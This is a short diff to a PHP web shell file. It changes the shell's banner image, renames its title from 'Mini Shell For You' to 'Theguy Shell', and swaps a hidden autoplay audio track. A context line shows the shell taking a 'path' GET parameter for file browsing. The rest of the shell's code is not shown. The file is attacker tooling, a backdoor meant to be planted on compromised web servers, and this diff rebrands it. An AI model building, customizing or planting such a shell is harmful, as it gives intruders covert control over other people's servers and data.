@@ -48,8 +48,8 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<center><img src="https://l.top4top.io/p_1596f5kg40.jpg" height="500" width="500"></center>
-<h1><center><font color="aqua">Mini Shell For You</font></center></h1>
+<center><img src="https://a.top4top.io/p_1938qorwh0.jpg" height="500" width="500"></center>
+<h1><center><font color="aqua">Theguy Shell</font></center></h1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center"><br>
 <tr><td><font color="aqua">Path :</font> ';
 if(isset($_GET['path'])){
@@ -289,5 +289,5 @@ return $info;
 }
 ?>
 <p> <audio autoplay="autoplay" hidden="hidden">
-<source src="https://a.top4top.net/m_10529k3yh1.wma" type="audio/mp3"> </source></audio><audio autoplay="autoplay" hidden="hidden"> <source src="https://a.top4top.net/m_10529k3yh1.wma" type="audio/mp3"> </source></audio></p>
+<source src="https://a.top4top.net/m_10529k3yh1.wma" type="audio/mp3"> </source></audio><audio autoplay="autoplay" hidden="hidden"> <source src="https://g.top4top.io/m_1938wr2vq0.mp3" type="audio/mp3"> </source></audio></p>
 
